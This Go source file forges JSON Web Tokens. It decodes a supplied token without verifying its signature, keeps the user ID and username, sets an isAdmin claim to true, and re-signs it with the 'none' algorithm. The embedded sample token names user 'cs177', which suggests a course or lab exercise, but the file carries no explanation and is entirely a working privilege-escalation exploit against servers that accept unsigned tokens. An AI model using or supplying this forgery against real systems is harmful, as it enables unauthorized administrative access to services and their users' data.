package main

import (
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

type JWTPayload struct {
	UserID   string `json:"userid"`
	Username string `json:"username"`
	IsAdmin  bool   `json:"isAdmin"`
	jwt.RegisteredClaims
}

func decodeJWT(tokenString string) (*JWTPayload, error) {
	parser := jwt.Parser{}
	token, _, err := parser.ParseUnverified(tokenString, &JWTPayload{})

	if err != nil {
		return nil, err
	}

	if claims, ok := token.Claims.(*JWTPayload); ok {
		return claims, nil
	}
	return nil, fmt.Errorf("invalid token claims")
}

func createModifiedJWT(originalJWT string) string {
	originalPayload, err := decodeJWT(originalJWT)
	if err != nil {
		fmt.Println("Error decoding original token:", err)
		return ""
	}

	claims := &JWTPayload{
		UserID:   originalPayload.UserID,
		Username: originalPayload.Username,
		IsAdmin:  true,
	}

	token := jwt.NewWithClaims(jwt.SigningMethodNone, claims)
	tokenString, err := token.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Println("Error creating token:", err)
		return ""
	}

	return tokenString
}

func main() {
	// Replace this with your JWT token
	originalJWT := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiI4NTkwMTg2NCIsInVzZXJuYW1lIjoiY3MxNzcifQ.vbR9gzI7MN-cFMuPkFvT4h1Hv5a44EHODfx66vkx-jE"

	fmt.Println("Original JWT:", originalJWT)
	originalPayload, err := decodeJWT(originalJWT)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Printf("\nExtracted values from original token:")
	fmt.Printf("\nUserID: %s", originalPayload.UserID)
	fmt.Printf("\nUsername: %s\n", originalPayload.Username)

	modifiedJWT := createModifiedJWT(originalJWT)
	fmt.Println("\nModified JWT (none algorithm):", modifiedJWT)
}
